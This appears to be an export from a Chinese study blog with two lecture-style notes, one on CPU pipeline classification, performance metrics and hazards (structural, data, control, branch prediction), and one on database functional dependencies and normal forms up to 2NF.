<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E6%97%B6%E7%A9%BA%E5%9B%BE-%E6%A0%B7%E4%BE%8B.png" alt=""></p>
<h3 id="流水线的分类"><a href="#流水线的分类" class="headerlink" title="流水线的分类"></a>流水线的分类</h3><h4 id="单功能流水线-多功能流水线"><a href="#单功能流水线-多功能流水线" class="headerlink" title="单功能流水线/多功能流水线"></a>单功能流水线/多功能流水线</h4><ul>
<li><p>单功能流水线，是指只能完成一种固定功能的流水线。</p>
</li>
<li><p>多功能流水线，是指各段可以进行不同的连接，从而完成不同的功能</p>
</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/TIASC.png" alt=""></p>
<p>例如 TI ASC多功能流水线 可以选择部分段来实现浮点相加或定点相乘功能</p>
<h3 id="静态流水线-动态流水线"><a href="#静态流水线-动态流水线" class="headerlink" title="静态流水线/动态流水线"></a>静态流水线/动态流水线</h3><ul>
<li><p>静态流水线，是指在同一时间内，流水线的各段 只能按同一种功能的连接方式工作。 </p>
</li>
<li><p>动态流水线，是指在同一时间内，当某些段正在实现某种运算时，另一些段却在实现另一种运算。 它会使得流水线控制变得复杂</p>
</li>
</ul>
<p>　在静态流水线中,同一时间内它只能以一种功能方式工作.它可以是单功能的,也可以是多功能的.当是多功能流水线时,则从一种功能方式变为另一种功能方式时,必须先排空流水线,然后为另一种功能设置初始条件后方可使用.显然,不希望这种功能的转换频繁的发生,否则将严重影响流水线的处理效率.</p>
<p>　　动态流水线则允许在同一时间内将不同的功能段连接成不同的功能子集(前提条件是功能部件的使用不发生冲突),以完成不同的运算功能.显然, <u>动态流水线必是多功能流水线,而单功能流水线则必是静态的</u>.</p>
<ul>
<li>动态流水线首先需要是多功能流水线.</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E5%8A%A8%E6%80%81%E6%B5%81%E6%B0%B4%E7%BA%BF.png" alt=""></p>
<p>如图所示, 动态流水线可以在同一时间进行两种不同的功能. </p>
<h3 id="部件级-处理机级-处理机间级-流水线"><a href="#部件级-处理机级-处理机间级-流水线" class="headerlink" title="部件级/处理机级/处理机间级 流水线"></a>部件级/处理机级/处理机间级 流水线</h3><p>这类划分是根据流水线的级别的划分, 从上往下由精细到宏观</p>
<ul>
<li><p>部件级流水线，又叫运算操作流水线，是把处理机 的算术逻辑部件分段，使得各种数据类型的操作能 够进行流水。 </p>
<p>例如我们上面涉及到的关于浮点运算的流水想. 把单个运算再细分</p>
</li>
<li><p>处理机级流水线，又叫指令流水线，是把解释指令的过程按照流水方式处理。 </p>
<p>例如 把一条指令的运行分为 取指,取数,执行 三阶段</p>
</li>
<li><p>处理机间流水线，又叫宏流水线，是由两个以上的 处理机串行地对同一数据流进行处理，每个处理机 完成一项任务</p>
<p>例如, 处理器A负责图像的采集, 处理器B负责图像的压缩, 处理器C负责图像的储存. 这种流水线更偏向于宏观层面</p>
</li>
</ul>
<h3 id="线性流水线-非线性流水线"><a href="#线性流水线-非线性流水线" class="headerlink" title="线性流水线/非线性流水线"></a>线性流水线/非线性流水线</h3><ul>
<li>线性流水线是指流水线的各段串行连接，没有反馈回路</li>
<li>非线性流水线是指流水线中除有串行连接的通路外，还有反馈回路</li>
</ul>
<hr>
<h2 id="流水线的性能"><a href="#流水线的性能" class="headerlink" title="流水线的性能"></a>流水线的性能</h2><h3 id="吞吐率"><a href="#吞吐率" class="headerlink" title="吞吐率"></a>吞吐率</h3><p>吞吐率是指单位时间内流水线所完成的任务数或 输出结果的数量。</p>
<ul>
<li>最大吞吐率 TP max 是指流水线在达到稳定状态后 所得到的吞吐率。 </li>
<li>设流水线由 m 段组成，完成 n 个任务的吞吐率称为 实际吞吐率，记作TP</li>
</ul>
<h4 id="最大吞吐率"><a href="#最大吞吐率" class="headerlink" title="最大吞吐率"></a>最大吞吐率</h4><p>假设流水线各段的时间相同,均为 $\Delta t$, 则 $TP_{max} = 1/\Delta t_0$<br>假设流水线各段的时间不同,第 $i$ 段时间为 $\Delta t_i$, 则 $TP_{max} = 1/max\{\Delta t_i\}$ </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/TPmax.png" alt=""></p>
<p>图(a) 表示各段的时间相同的流水线, 图(b)表示各段时间不等的流水线.</p>
<ul>
<li>由此可见, 最大吞吐率率取决于流水线中最慢一段所需的时间，该段成为流水线的瓶颈</li>
<li>消除瓶颈的方法主要有:  细分瓶颈段 重复设置瓶颈段</li>
</ul>
<p>图为: 细分瓶颈段</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E7%BB%86%E5%88%86%E7%93%B6%E9%A2%88.png" alt=""></p>
<p>图为: 重复设置瓶颈段</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E9%87%8D%E5%A4%8D%E7%93%B6%E9%A2%88%E6%AE%B5.png" alt=""></p>
<h4 id="实际吞吐率"><a href="#实际吞吐率" class="headerlink" title="实际吞吐率"></a>实际吞吐率</h4><p>若各段时间相等（假设均为 $Δt_0$),则完成时间 </p>
<script type="math/tex; mode=display">
T_{流水}=m\Delta t_0+(n-1)\Delta t_0</script><p>其中,前一项表示流水线完全启动的时间，后一项表示剩下的工作时间，因此:</p>
<script type="math/tex; mode=display">
TP=\frac n {T_{流水}} = \frac n {m\Delta t_0+(n-1)\Delta t_0} = \frac 1 {(1 + \frac {m-1} n)\Delta t_0} = \frac {TP_{max}} {1 + \frac {m-1} n}</script><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/T%E6%B5%81%E6%B0%B4.png" alt=""></p>
<p>若各段时间不等（假设为 $Δt_i$ ),则完成时间：</p>
<script type="math/tex; mode=display">
T=\sum^m _{i=1}\Delta t_i+(n-1)\times max\{\Delta t_i\}</script><p>其中,前一项表示流水线完全启动的时间.后一项表示剩下的工作时间,因此:</p>
<script type="math/tex; mode=display">
TP=\frac n T = \frac n {\sum^m _{i=1}\Delta t_i+(n-1)\times max\{\Delta t_i\}}</script><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/TP2.png" alt=""></p>
<h3 id="加速比"><a href="#加速比" class="headerlink" title="加速比"></a>加速比</h3><p>加速比是指流水线速度与等功能的非流水线速度之比。 </p>
<script type="math/tex; mode=display">
加速比 S = \frac {T_{非流水}} {T_{流水}}</script><p>若流水线为 m 段，总计 n 个任务，每段时间均为 $\Delta t_0$：</p>
<script type="math/tex; mode=display">
 T_{非流水}=nm\Delta t_0,T_{流水}=m\Delta t_0+(n-1)\Delta t_0\\
 S =\frac {T_{非流水}} {T_{流水}}=\frac {nm} {m+(n-1)}=\frac m {1+\frac {m-1} n}\\
 由此可见,n\gg m时,S\approx m</script><p>各段时间不相等的流水线带入上上个公式即可</p>
<h3 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h3><p>效率指流水线的<strong>设备利用率</strong>。 </p>
<p>画出时空图, 然后数格子</p>
<script type="math/tex; mode=display">
E=\frac {n个任务占用的时空区} {m个段总的时空区}</script><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/09/%E6%95%88%E7%8E%87.png" alt=""></p>
<p>例如, 上图的效率为</p>
<script type="math/tex; mode=display">
E = \frac {紫色格子数目} {总的格子数目} = \frac {n} {n+(m-1)}</script><p>当然, 应当比较的是面积, 这里由于每个格子面积相同故略去。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>流水线并不能减少（一般反而会增加）单条指令 的执行时间，但能够提高吞吐率 </li>
<li>增加流水线的深度可以提高流水线性能 </li>
<li>流水线深度受限于流水线的延迟和额外开销 </li>
<li>需要用高速锁存器作为流水线寄存器 </li>
<li>指令之间存在的相关，限制了流水线的性能</li>
</ul>
<h2 id="流水线中的相关"><a href="#流水线中的相关" class="headerlink" title="流水线中的相关"></a>流水线中的相关</h2><ul>
<li><p>流水线中的相关是指相邻或相近的两条指令因存在 某种关联，后一条指令不能在原先指定的时钟周期 开始执行。</p>
</li>
<li><p>消除相关的基本方法——暂停</p>
</li>
</ul>
<p>暂停流水线中某条指令及其后面所有指令的执行， 该指令之前的所有指令继续执行</p>
<p>  显然, 暂停会降低吞吐率</p>
<p>相关的类型 </p>
<ul>
<li>结构相关：当指令在重叠执行过程中，硬件资源 满足不了指令重叠执行的要求，发生资源冲突时 将产生“结构相关”。</li>
<li>数据相关：因一条指令需要用到前面指令的结果， 而无法与产生结果的指令重叠执行时，就发生了 “数据相关”。</li>
<li>控制相关：当流水线遇到分支指令和其它会改变 PC 值的指令时就发生“控制相关”。</li>
</ul>
<h3 id="结构相关"><a href="#结构相关" class="headerlink" title="结构相关"></a>结构相关</h3><p>当指令在重叠执行过程中，硬件资源 满足不了指令重叠执行的要求，发生资源冲突时 将产生“结构相关”。例如，当一条指令正在从存储器中取出时，另一条指令恰好在将一个数据存储到存储器中，因两者都要访问存储器，故出现冲突</p>
<h4 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h4><p>假定，4级指令流水线包括：取指、取数、运算和存数，各段时间均为 $\Delta t$，执行下面的指令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD MM,R1,R2</span><br><span class="line">SUB R3,R4,R5</span><br><span class="line">AND R7.R6.R10</span><br><span class="line">XOR R8,R9,R10</span><br></pre></td></tr></table></figure>
<p>在上图中的第四个时间点需要 <u>同时进行取指与存数操作</u>,而同一个存储区不能同时完成读操作和写操作.</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h4><p>结构竞争的原因是硬件不能满足重叠执行的要求。于是我们可以: 1) 用更多硬件 2) 不重叠执行 3) 使硬件可以重叠执行</p>
<ol>
<li><p>增加资源副本</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/11/%E7%BB%93%E6%9E%84%E7%9B%B8%E5%85%B3.png" alt=""></p>
<p>例如上例: 可以设计一个数据存储器和一个指令存储器，这样，流水线的取指段与数据访存段就可以通过两个独立的通路同时访问两个独立的存储器了。</p>
</li>
<li><p>暂停(或延迟)流水线</p>
<p>通过延迟（或暂停）流水线的冲突段, 这被称作在流水线中插入气泡</p>
<p>气泡在流水线中只占资源不做实际操作. 显然会降低吞吐率</p>
<p>但是相对其他两个方法硬件成本更低</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/11/%E6%B0%94%E6%B3%A1.png" alt=""></p>
</li>
<li><p>改变资源以便它们并发使用</p>
<p>除上述措施外，在相邻近的指令间尽可能不使用相同的资源。例如，在相邻的m（流水线的段数）条指令中，不相关的数据尽量使用不同的寄存器。如果发生使用寄存器冲突时，可以通过程序再设计或寄存器重命名技术来改变寄存器资源，达到可以同时对期望的寄存器访问的目的。</p>
</li>
</ol>
<h3 id="数据相关"><a href="#数据相关" class="headerlink" title="数据相关"></a>数据相关</h3><p>当指令在流水线中重叠执行时，流水线有可能改变指令读/写操作数的顺序，使之不同于它们在非流水实现时的顺序，这将导致数据相关。</p>
<h4 id="数据相关的分类"><a href="#数据相关的分类" class="headerlink" title="数据相关的分类"></a>数据相关的分类</h4><p>注: 分类是按照正常顺序</p>
<ol>
<li><p>写后读 RAW</p>
<p>如果先读后写, 那么读取的是错误的数据. 是最常见的数据相关.</p>
</li>
<li><p>写后写 WAW</p>
<p>如果后者先写,前者后写, 可能R中保存着错误的数据.</p>
</li>
<li><p>读后写 WAR</p>
<p>如果后者先写, 可能前者读出了错误数据. 但是这种相关很少发生</p>
</li>
<li><p>读后读 RAR</p>
<p>不会引起数据相关</p>
</li>
</ol>
<h4 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="解决办法"></a>解决办法</h4><ol>
<li><p>采用直通（forwarding）技术 </p>
<p>又名定向技术, 旁路, 短路</p>
<p>控制逻辑将前面指令的结果从其产生的地方直接连通到 当前指令所处的位置。</p>
</li>
<li><p>增加专用硬件</p>
<p>增加流水线互锁（pipeline interlock）硬件。互锁硬件先要 检测流水线中指令的数据相关性，当互锁硬件发现数据 相关时，使流水线工作停顿下来，直到相关消失为止。 </p>
</li>
<li><p>利用编译器 流水线调度/指令调度</p>
<p>编译器可以对指令重新排序或插 入空操作指令，使得加载任何冲突数据的操作被延迟， 但对程序逻辑或输出不受影响</p>
</li>
</ol>
<h3 id="控制相关"><a href="#控制相关" class="headerlink" title="控制相关"></a>控制相关</h3><p>当流水线遇到分支指令和其它会改变PC值的指令时 就发生“控制相关”</p>
<ul>
<li>无条件转移指令（如无条件跳转、调用、返回指令等）<ul>
<li>某些CPU（如 UltraSPARC l）：紧跟在无条件转移指令之后的指令必须执行。</li>
<li>另一些CPU：采取相对复杂的方法，如提前计算出转移目标地址</li>
</ul>
</li>
<li>条件分支转移指令（为零跳转、循环控制指令等）<ul>
<li>不仅需要延迟槽，而且一直到流水线的深处，取指单元才能知道到哪里去取下一条指令。</li>
<li>条件分支指令对流水线性能的影响远比无条件转移指令要大。</li>
</ul>
</li>
</ul>
<p>以下是针对条件分支指令的处理方法</p>
<h4 id="冻结流水线-freeze"><a href="#冻结流水线-freeze" class="headerlink" title="冻结流水线(freeze)"></a>冻结流水线(freeze)</h4><p>一旦在指令译码段检测到分支指令，就在转移目标地址确定之前保存或删除所有紧随分支指令之后的指令，当分支指令从执行段流出、确定出新的PC值时，流水线才继续依据新PC值填充流水线. <u>会严重地影响流水线的性能</u>。</p>
<h4 id="预取分支目标（-prefetch-branch-target）"><a href="#预取分支目标（-prefetch-branch-target）" class="headerlink" title="预取分支目标（ prefetch branch target）"></a>预取分支目标（ prefetch branch target）</h4><p>当条件分支指令被识别时，除了紧随其后的指令外，分支目标也被预取，并保存到分支指令被执行</p>
<p>如果分支跳转发生，已预取到的目标指令可立刻执行。</p>
<h4 id="多流"><a href="#多流" class="headerlink" title="多流"></a>多流</h4><p>有些系统采用在条件分支的两路上同时启动取指令操作，并将指令保存到分支指令被<br>实际执行的时候。分支指令执行时，“真”的执行通路即刻可以获得。这种方法是对预取分<br>支目标的发展。</p>
<h4 id="循环缓冲器"><a href="#循环缓冲器" class="headerlink" title="循环缓冲器"></a>循环缓冲器</h4><p>在许多处理器中，用循环缓冲器来解决分支程序引起的相关。循环缓冲器是一个容量很小、速度非常高的存储器。它保存着最近获取的n条顺序的指令，由流水线的取指段进行维护。如果分支发生，硬件首先检查分支目标是否在缓冲器中。如果在，下一条指令从缓冲器中获取。</p>
<ol>
<li>如果正常顺序运行, 那么就正常顺序运行</li>
<li>如果发生了分支. 那么在判断之后选择语句执行时, 要执行的语句已经录入缓冲器中, 可相比从内存中取指令更快. 此外, 这也表明<code>if..else..</code>语句性能优于<code>if..if..</code> 语句</li>
<li>特别是对于循环操作. 如果缓冲器够大, 那么只需要从内存中读取一次循环体的指令, 其余均从缓冲器中读出. 因此命名为循环缓冲器.</li>
</ol>
<p>循环缓冲器类似于指令 cache，差别是循环缓冲器仅保留顺序指令，且容量比 cache小得多，因此成本较低。</p>
<h4 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h4><p>为了降低分支指令引起断流（停顿）对流水线可能带来的影响，许多CPU提供了分支<br>预测机构。预测既可以在编译阶段静态完成，也可以由硬件在执行阶段动态完成。要做到<br>百分之百的正确预测几乎是不可能的，但采用分支预测必定能带来某些好处。</p>
<h4 id="静态分支预测"><a href="#静态分支预测" class="headerlink" title="静态分支预测"></a>静态分支预测</h4><p>静态分支预测是根据某种规则进行分支预测.</p>
<h5 id="预测分支不会发生"><a href="#预测分支不会发生" class="headerlink" title="预测分支不会发生"></a>预测分支不会发生</h5><p>预测分支不会发生也就是预测分支失败。如果一个程序中大多数条件分支指令是用于出错检测处理，那么采用这种预测机制是有利的，因为在正确合理的设计下，出现错误的概<br>率总是很小的。在这样的预测机制下，在知道分支结果之前，流水线流动着分支指令和紧随其后的指令。若分支预测失败，则正如所预期的那样，流水线照常执行；若分支成功，则要用空操作代替已取得的指令（例如清除执行段之前的各流水线段），并到目标地址重新取指令。</p>
<h5 id="预测分支总是成功"><a href="#预测分支总是成功" class="headerlink" title="预测分支总是成功"></a>预测分支总是成功</h5><p>如果一个程序中包含较多的循环，那么采用这种预测机制是有利的，因为n次循环仅有<br>次会出现分支转移失败。因此，该方法也称为预测分支成功法。在这样的预测机制下，<br>旦分支转移成功就可以开始从分支目标地址处取指令执行。</p>
<h5 id="由编译器进行预测"><a href="#由编译器进行预测" class="headerlink" title="由编译器进行预测"></a>由编译器进行预测</h5><p>当编译器看到循环语句<code>for（i=0；&lt;1000000计++）{…}</code>时，它就知道循环尾部的转移<br>几乎肯定会发生。如果能有办法让编译器把这一信息告诉硬件，将会节省大量的时间。但<br>是，使用这种技术会带来体系结构的变化，某些处理器中设计了一组新的条件转移指令，这些指令中有一位可以让编译器设置. 取值单元将根据这指令行动.</p>
<h5 id="剖面法"><a href="#剖面法" class="headerlink" title="剖面法"></a>剖面法</h5><p>剖面法是一种追踪程序执行状况加以预测的方法。它实际运行了该程序（一般是在模拟器上），以获得程序中不同分支指令发生转移的信息（比如概率），然后将这些信息送给编译器，编译器再使用特殊的条件转移指令来通知硬件该如何操作。</p>
<p>当静态分支预测错误时, 如何取消已经执行的指令?</p>
<ul>
<li>总是执行，结果保存在临时寄存器中。当得知预测成功时再复制至实际寄存器</li>
<li>将要被覆盖的寄存器的原值保存在临时寄存器中, 当得知预测失败时恢复</li>
</ul>
<h3 id="动态分支预测"><a href="#动态分支预测" class="headerlink" title="动态分支预测"></a>动态分支预测</h3><p>动态分支预测通过记录分支指令的近期运行的历史信息，并以此作为预测的依据，来提高分支预测的准确度。解决好动态预测的关键是如何记录历史信息和如何决定转移的走向</p>
<h3 id="延迟分支"><a href="#延迟分支" class="headerlink" title="延迟分支"></a>延迟分支</h3><ul>
<li><p>这种方法是利用编译器对指令代码进行重新排序，并插入有用指令或空操作指令<br>（NOP），使流水线尽可能保持充满状态。</p>
</li>
<li><p>其中心思想就是延迟分支的发生。</p>
</li>
<li><p>把分支指令延迟为长度为n的分支指令，其后紧跟有n个延迟槽，延迟槽中放有延迟分支需要执行的指令。流水线遇到分支指令时，按正常方式处理，同时执行延迟槽中的指令，分支延迟槽中的指令“掩盖”了流水线原来必须插入的停顿周期，从而减少分支开销。</p>
</li>
<li><p>编译器的任务就是在延迟槽中放入有用的指令，称为延迟槽调度。有三种常用的调度方法：</p>
<ul>
<li>从分支前调度</li>
<li>从目标出调度</li>
<li>从失败处调度</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202010/11/%E7%BB%93%E6%9E%84%E7%9B%B8%E5%85%B3.png" alt=""></p>
</li>
</ul>
<p>该方法有两个限制: </p>
<p>（1）放入延迟槽的指令需要满足一定的条件。<br>（2）编译器要有预测分支是否成功的能力。</p>
<p>剩下的先咕咕咕</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>计算机组成</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>计算机组成</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库系统之范式</title>
    <url>/2020/11/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%8C%83%E5%BC%8F/</url>
    <content><![CDATA[<p>本文介绍了数据库系统设计时的范式问题：</p>
<ol>
<li>码与主码</li>
<li>函数依赖</li>
<li>第一范式</li>
<li>第二范式</li>
<li>第三范式</li>
<li>BC 范式</li>
</ol>
<a id="more"></a>
<h2 id="理解范式"><a href="#理解范式" class="headerlink" title="理解范式"></a>理解范式</h2><p>范式是“符合某一种级别的关系模式的集合，表示一个关系内部各属性之间的联系的合理化程度”</p>
<p>如何理解这句话? 在设计一个数据库系统时，我们实际上时在设计不同实体之间的<strong>关系</strong>。那么设计关系时所循行的标准，称为范式。具体有哪些标准呢？我们一般将数据库范式分为1NF，2NF，3NF，BCNF，4NF，5NF。这代表着不同级别的设计标准。符合高一级别的范式，必定符合第一级别的范式。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>【前置知识部分来自掘金用户@奋斗的小皇帝，有删改，链接见文末】</p>
<p>在学习数据库范式之前，我们必须了解一些前置知识，这些知识在后续的内容将会大量使用，如果对这些不了解，那么将会对后面的内容一头雾水。</p>
<p>首先，我们定义一张表，并添加一些数据，这个表 1 （选课表）有助于我们理解这些概念：</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/6/8/172944729191ddd4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<h3 id="码"><a href="#码" class="headerlink" title="码"></a>码</h3><p>关系中的某个或者某几个属性的集合，用于唯一地标识每一条数据（这里的每一条数据就是数据库中的每一条记录）。</p>
<blockquote>
<p>请注意：码可以是一个或多个属性，一个表中可能存在多个码。例如，{学号，选课}这两个属性组成的码可以唯一地确定数据库的条项。</p>
</blockquote>
<h4 id="候选码"><a href="#候选码" class="headerlink" title="候选码"></a>候选码</h4><p>在一个表的关系中，可以存在多个关系集合用于唯一确定一条记录，这些多个集合就称为<strong>候选码</strong>，也称为候选键。候选码可以存在多个，每一个候选码都可以唯一地确定一条记录。</p>
<p>我们换一种更加严谨的说法：假设 K 为某个表中的一个属性或者属性组，如果除去 K 之外的所有属性都<strong>完全函数依赖</strong>（稍后会介绍）于 K，那么我们就称 K 为候选码。</p>
<p>根据上表的示例我们可以得出一个候选码：</p>
<ul>
<li>（学号，课名）</li>
</ul>
<h4 id="主码"><a href="#主码" class="headerlink" title="主码"></a>主码</h4><p>通常我们会从候选码中选择一个码作为<strong>主码</strong>，也就是我们通常所说的主键。</p>
<h3 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h3><p>在数学上的解释是：<code>y = f(x)</code>，输入一个 X，可以得到一个确定的 Y。</p>
<p>对应到一个表上就是，在属性X 确定的情况下，必定能够确定某个属性 Y 的值，这就能够称作 Y 函数依赖于 X，写作 X -&gt; Y 。</p>
<blockquote>
<p>注意：X未必是一个属性，也可能是属性集合。</p>
</blockquote>
<p>记作：</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/6/8/17294478f4b78bd9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>比如下面这些关系都<strong>存在</strong>函数依赖：</p>
<ul>
<li>（学号）-&gt;（姓名）</li>
<li>（学号，课名）-&gt;（分数）</li>
<li>（系名）-&gt;（系主任）</li>
</ul>
<p>但是，下面这些关系就<strong>不存在</strong>函数依赖：</p>
<ul>
<li>（姓名）-&gt;（学号），因为有可能会出现重名的情况，所以只依靠姓名是无法确定学号的。</li>
<li>（学号）-&gt;（分数），因为一个学号有多个科目，每一个科目都存在一个分数，不能只靠学号来确定分数。</li>
<li>……</li>
</ul>
<h4 id="完全函数依赖"><a href="#完全函数依赖" class="headerlink" title="完全函数依赖"></a>完全函数依赖</h4><p>在一个表中，如果存在 X -&gt; Y，那么对于 X 下的任何一个真子集（X’），X’ -&gt; Y都不成立，那么我们就说 Y 对于 X 完成函数依赖。</p>
<blockquote>
<p>如果X可以唯一确定Y，并且找不到X中的更少的属性可以唯一确定Y，那么称之为完全函数依赖。</p>
</blockquote>
<p>记作：X -&gt;F  Y</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/6/8/1729447d6caba0f9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>通俗的说，必须通过码中的所有属性才可以唯一确定一个值。比如：</p>
<ul>
<li>（学号）-&gt;F（姓名）</li>
<li>（学号，课名）-&gt;F（分数）</li>
</ul>
<h4 id="部分函数依赖"><a href="#部分函数依赖" class="headerlink" title="部分函数依赖"></a>部分函数依赖</h4><p>在一个表中，如果存在 X -&gt; Y，但是 Y 并不完成依赖于 X。存在一些 X 的子集 X’，X‘ -&gt; Y成立，那么我们就说 Y 对于X 部分函数依赖。</p>
<p>记作：X -&gt;P Y</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/6/8/17294481094df130?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>通俗的说，只需要码中的部分属性即可唯一确定一个值。比如：</p>
<ul>
<li>（学号，课名）-&gt; （姓名），只需要根据码中的学号即可唯一确定姓名。</li>
</ul>
<p><strong>它跟完全函数依赖的区别在于，完全函数依赖必须要通过码中的所有属性才可以唯一确定一个值，而部分函数依赖只需要码中的部分属性即可。</strong></p>
<h4 id="传递函数依赖"><a href="#传递函数依赖" class="headerlink" title="传递函数依赖"></a>传递函数依赖</h4><p>如果 Z 函数依赖于 Y，Y 函数依赖于 X，并且 X 不函数依赖于 Y，那么我们就说 Z 传递函数依赖于 X。</p>
<p>记作：X -&gt;T Z</p>
<p><img src="https://user-gold-cdn.xitu.io/2020/6/8/17294484b7bd7b14?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>通俗的说，通过码可以唯一确定一个属性，然后通过该属性可以唯一确定另一个属性，所以就演变为了可以通过码唯一确定一个无函数依赖的属性。</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性就是我们在表中定义的每一个列。</p>
<h4 id="主属性"><a href="#主属性" class="headerlink" title="主属性"></a>主属性</h4><p>在码中的所有属性（每一列）都称为主属性</p>
<h4 id="非主属性"><a href="#非主属性" class="headerlink" title="非主属性"></a>非主属性</h4><p>除了主属性之外的其他属性，都称为非主属性。</p>
<h2 id="范式标准"><a href="#范式标准" class="headerlink" title="范式标准"></a>范式标准</h2><h3 id="1NF"><a href="#1NF" class="headerlink" title="1NF"></a>1NF</h3><p>1NF的定义为：符合1NF的关系中的<strong>每个属性都不可再分</strong>。</p>
<p>何谓属性不能再分？ 举例：你可以把<code>数量</code> 、<code>单价</code>分别作为两个属性设计，这是符合范式的。如果你设计了<code>进货</code>这一属性，并且将<code>数量</code> 、<code>单价</code>作为两个子属性设计，这不符合范式。事实上这个例子应该是列族数据库。（一种NoSQL）</p>
<p><strong>1NF是所有关系型数据库的最基本要求</strong>，你在关系型数据库管理系统（RDBMS），例如SQL Server，Oracle，MySQL中创建数据表的时候，如果数据表的设计不符合这个最基本的要求，那么操作一定是不能成功的。</p>
<p>但是其实也不一定如此。例如，<code>地址</code>属性中的值可以是“陕西省西安市长安区西安电子科技大学”， 也可以分别设置多个属性：<code>省份</code>、<code>城市</code>、<code>区县</code>、<code>详细地址</code>。<code>地址</code>属性理论上是可以再分的，但实际生产中也可以使用。当然，从数据库设计的角度肯定是设置成多个属性更佳。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/1NF.jpg" alt="1NF"></p>
<p>即便满足1NF，数据库还可能会出现以下问题：</p>
<ol>
<li><p>数据冗余</p>
<p>每一名学生的学号、姓名、系名、系主任这些数据重复多次。每个系与对应的系主任的数据也重复多次</p>
</li>
<li><p>插入异常</p>
<p>假如学校新建了一个系，但是暂时还没有招收任何学生，那么是无法将系名与系主任的数据单独地添加到数据表中去。</p>
</li>
<li><p>删除异常</p>
<p>假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。</p>
</li>
<li><p>修改异常</p>
<p>假如李小明转系到法律系，那么为了保证数据库中数据的一致性，需要修改三条记录中系与系主任的数据</p>
</li>
</ol>
<h3 id="2NF"><a href="#2NF" class="headerlink" title="2NF"></a>2NF</h3><p><strong>2NF 在 1NF 的基础上，消除了非主属性对码的部分函数依赖</strong> 。</p>
<blockquote>
<p><strong>码</strong>是可以唯一确定一条记录的属性集合；</p>
<p><strong>非主属性</strong>是除了码中属性之外的其他属性。</p>
<p>部分函数依赖：只需要码中的部分属性即可唯一确定一个值。</p>
</blockquote>
<p>判断是否符合 2NF 可以通过以下步骤：</p>
<ol>
<li>找出表中所有的<strong>码（候选码）</strong>。</li>
<li>根据第一步得出的码找出所有的<strong>主属性</strong>。</li>
<li>除了主属性之外的其他属性，就都是<strong>非主属性</strong>。</li>
<li>判断是否存在非主属性<strong>部分函数依赖</strong>于码。</li>
</ol>
<p>例如上例中：</p>
<ol>
<li><p>候选码包括：{学号，课程}</p>
</li>
<li><p>主属性：学号、课程</p>
</li>
<li><p>非主属性：姓名、系名、系主任、分数</p>
</li>
<li><p>依次考察这些非主属性：</p>
<ol>
<li><p>姓名：有 学号-&gt;姓名，部分函数依赖</p>
</li>
<li><p>系名：有 学号-&gt;系名，部分函数依赖</p>
</li>
<li><p>系主任：有 学号-&gt;系主任，部分函数依赖</p>
<blockquote>
<p>注：显然，系主任也可以被系名唯一确定；这其实是第三范式的问题，我们稍后讨论。</p>
<p>在此处，系主任也是可以被学号唯一确定的。</p>
</blockquote>
</li>
<li><p>分数：只有 {学号，课程}-&gt;分数，完全函数依赖</p>
</li>
</ol>
</li>
</ol>
<p>在上面这张表中，我们发现 <strong>非主属性</strong> 中只有<code>分数</code>这一项完全依赖的。因此我们可以将表拆为两张。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/2NF1.webp" alt="2NF1"></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/2NF2.webp" alt="2NF2"></p>
<p>再次检查，不难看出学生表也是2NF 的。</p>
